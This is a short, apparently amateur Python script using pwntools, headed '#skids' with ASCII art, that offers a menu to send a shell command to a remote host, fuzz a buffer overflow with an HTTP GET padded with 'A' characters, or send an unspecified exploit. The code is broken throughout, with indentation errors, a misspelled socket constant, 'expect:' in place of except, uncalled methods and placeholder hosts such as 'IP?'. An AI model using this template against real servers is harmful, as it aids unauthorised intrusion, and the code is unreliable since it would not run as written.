#skids
from pwn import *
import socket



print(f'''


        _nnnn_
        dGGGGMMb
       @p~qp~~qMb
       M|@||@) M|
       @,----.JM|
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMP|   .'
     `-'       `--' 

''')





n = input("would u like to connect and send a command(1), do a buffer overflow?(2) or 3 send an exploit? ")
if n == "1":
 r = remote("IP", 'port')
r.sendline("ls")
r.interactive

if n == "2":

 while True:
     try:
           s.socket.socket(socket.AF_INET,socket.SOCK_STEAM)
           socket.connect("ip" 'port')


buffer_length = 50
name = 'A'*buffer_length

payload = 'GET' + name + 'http/1.1\r\n\r\n'

s.send(payload.encode('raw_unicode_escape'))

print("payload sent")
socket.close
expect: print("maybe overflow is at {}".format(buffer_length))




if n == "3":
    r = remote('IP?', port)
# put exploit below
r.send(lang?(file?()))
r.interactive()
